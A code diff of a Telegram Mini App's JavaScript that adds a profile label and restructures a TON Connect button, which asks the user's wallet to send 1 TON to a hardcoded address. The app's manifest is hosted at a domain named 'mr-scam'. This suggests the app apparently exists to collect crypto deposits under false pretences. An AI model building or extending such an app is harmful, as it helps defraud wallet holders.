@@ -15,7 +15,7 @@ window.addEventListener('load', () => {
     const user = tg.initDataUnsafe.user;
     username = user.username ? '@' + user.username : user.first_name || 'User';
   }
-  usernameEl.textContent = username;
+  usernameEl.textContent = 'Профиль: ' + username;
 
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
@@ -36,36 +36,29 @@ window.addEventListener('load', () => {
     }
   });
 
-  document.getElementById('payment-btn').onclick = async () => {
-    if (!connectedWallet) {
-      alert('⚠️ Подключите кошелёк сначала!');
-      return;
-    }
+  const paymentBtn = document.getElementById('payment-btn');
+  if (paymentBtn) {
+    paymentBtn.onclick = async () => {
+      if (!connectedWallet) {
+        alert('⚠️ Подключите кошелёк сначала!');
+        return;
+      }
 
-    const transaction = {
-      validUntil: Math.floor(Date.now() / 1000) + 600,
-      messages: [{
-        address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
-        amount: '1000000000'
-      }]
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 360, // 6 минут
+        messages: [{
+          address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
+          amount: '1000000000' // 1 TON в нанотонах
+        }]
+      };
+
+      try {
+        const result = await tonConnectUI.sendTransaction(transaction);
+        alert('✅ 1 TON успешно отправлено! Транзакция: ' + result);
+      } catch (e) {
+        console.error(e);
+        alert('❌ Ошибка отправки: ' + (e.message || 'Отменено'));
+      }
     };
-
-    try {
-      await tonConnectUI.sendTransaction(transaction);
-      alert('✅ 1 TON успешно внесено!');
-    } catch (e) {
-      alert('❌ Ошибка или отменено');
-    }
-  };
-
-  // Переключение разделов
-  document.querySelectorAll('.nav-item').forEach(item => {
-    item.addEventListener('click', () => {
-      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-      document.querySelector(`#${item.dataset.section}`).classList.add('active');
-
-      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-      item.classList.add('active');
-    });
-  });
+  }
 });
